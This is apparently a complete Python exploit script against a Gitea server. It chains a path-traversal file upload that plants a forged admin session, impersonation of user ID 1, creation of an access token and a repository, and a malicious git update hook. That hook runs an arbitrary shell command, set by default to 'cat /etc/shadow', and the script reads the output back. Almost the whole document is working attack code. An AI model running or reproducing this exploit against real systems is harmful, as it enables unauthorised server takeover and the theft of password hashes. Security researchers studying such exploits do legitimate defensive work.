from requests import Session
import json
import os
import random
import os
import re
import string
import urlparse
import urllib
from dulwich import porcelain

def get_random():
    	return ''.join(random.choice(string.lowercase) for x in range(6))

def get_csrf(path):
	temp = s.get("{}{}".format(url, path))
	content = temp.text.encode("utf-8")
	csrf = re.search('name="_csrf" content="([^"]+)"', content)
	if not csrf:
		print "[-] Cannot get CSRF token"
		os._exit(0)
	return csrf.group(1)

## CONFIGURATION
url = 'http://pen.gitea.local:3000/'
command = "cat /etc/shadow"
repo = 'myPublicRepo'
old_cookie = "38eafbf1c876471a"
csrf= "KZ13COkvYLN2kbHE0rJJ3QbMHxY6MTYxMzY2OTk2NTA5NDY3NTk2MA=="
## CONFIGURATION

# create a initial session
s = Session()
s.headers.update({'Cookie': 'i_like_gitea=' + old_cookie + ';_csrf=' + csrf})

# get the public repo url and id
r = s.get(('{}api/v1/repos/search?q=' + repo).format(url))
try:
	out = r.json()['data']
except:
	print "[-] Probably not gitea url"
	os._exit(0)

if len(out) != 1:
	print "[-] There are no public repos"
	os._exit(0)

out = out[0]
public_repo_id = int(out['id'])
public_repo_url = out['full_name']
print "[+] Found the public repo {} ID {}".format(public_repo_url, public_repo_id)

## CREATE THE FAKE SESSION

# upload the session file
r = s.post('{}{}/upload-file/'.format(url, public_repo_url), files={
	# ../../../sessions/0/0/00mySession -> path from the uploads folder to the sessions folder
	# three times back because uploads are placed into /uploads/[first digit of uuid]/[second digit of uuid]/[uuid]
	# the same procedure for the session /sessions/[first digit of uuid] => 0 /[second digit of uuid]  => 0 /[uuid] => 00mySession
	'file': ("../../../sessions/0/0/00mySession", open('session', "rb"))
}, headers={'Accept': 'application/json', 'Connection': 'close',  'X-Csrf-Token': csrf})

if(r.status_code != 200):
	print "[-] Could not upload session file"
	os._exit(0)
print "[+] Uploaded admin session file"

# perform the commit to the master branch
r = s.post(url + public_repo_url + '/_upload/master', data='_csrf=' + csrf + 
'&tree_path=&commit_summary=&commit_message=&commit_choice=direct&new_branch_name=&files=' +
json.loads(r.text)["uuid"], 
headers={'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded',  'X-Csrf-Token': csrf})

# set the cookie to our previously created admin session
s.headers.update({'Cookie': 'i_like_gitea=00mySession'})

## CREATE THE FAKE SESSION

# Get the first user by calling the REST API
r = s.get('{}api/v1/user'.format(url))
data = r.json()

if not "id" in data or data['id'] != 1:
	print "[-] Impersonation failed"
	os._exit(0)

user_name = data['login']
user_id = data['id']

print "[+] Logged in as {} ID {}".format(user_name, user_id)

# create a login token in the settings panel
csrf = get_csrf('user/settings/applications')
post_token = s.post('{}user/settings/applications'.format(url), data={'_csrf':csrf, 'name':get_random()}, allow_redirects=False)

try:
	login_token = post_token.cookies['macaron_flash']
	login_token = dict(urlparse.parse_qsl(urllib.unquote(login_token)))
	login_token = login_token['info']
except:
	print "[-] Cannot create token"
	os._exit(0)

print "[+] Successfully set a login token: {}".format(login_token)

# create a new repo
csrf = get_csrf('repo/create')
admin_repo_name = get_random()
print "[+] Try create repo {}".format(admin_repo_name)

repo_post = s.post("{}repo/create".format(url), data={'_csrf':csrf, 'uid':user_id, 'repo_name':admin_repo_name, 'readme': 'Default', 'auto_init':'on'}, allow_redirects=False)

if repo_post.status_code != 302:
	print "[-] Cannot create admin repo"
	os._exit(0)

print "[+] Created a new Repository" 

# set a git hook for update in the repo
# command = "#!/bin/sh [COMMAND] > objects/info/exploit"
csrf = get_csrf('{}/{}/settings/hooks/git/update'.format(user_name, admin_repo_name))
hook_posts = s.post('{}{}/{}/settings/hooks/git/update'.format(url, user_name, admin_repo_name), data={'_csrf':csrf, 'content':"#!/bin/sh\n{}>objects/info/exploit".format(command)}, allow_redirects=False)

if hook_posts.status_code != 302:
	print "[-] Cannot updatehook"
	os._exit(0)

print "[+] Added a update hook" 

# clone the repo, commit and push
clone_url = '{}{}:{}@{}{}/{}.git'.format(url[0:7], login_token, "", url[7:], user_name, admin_repo_name)
temp_repo_dir = get_random()
r = porcelain.clone(clone_url, temp_repo_dir)
porcelain.commit(r, get_random())
porcelain.push(r, clone_url, "master")

print "[+] Updated the Repository to trigger the hook" 

# read the command output from /objects/info/exploit
command_output = s.get('{}{}/{}/objects/info/exploit'.format(url, user_name, admin_repo_name))
if command_output.status_code != 200:
	print "[-] Cannot get exploit output"
	os._exit(0)
	
print command_output.text.encode("utf-8")
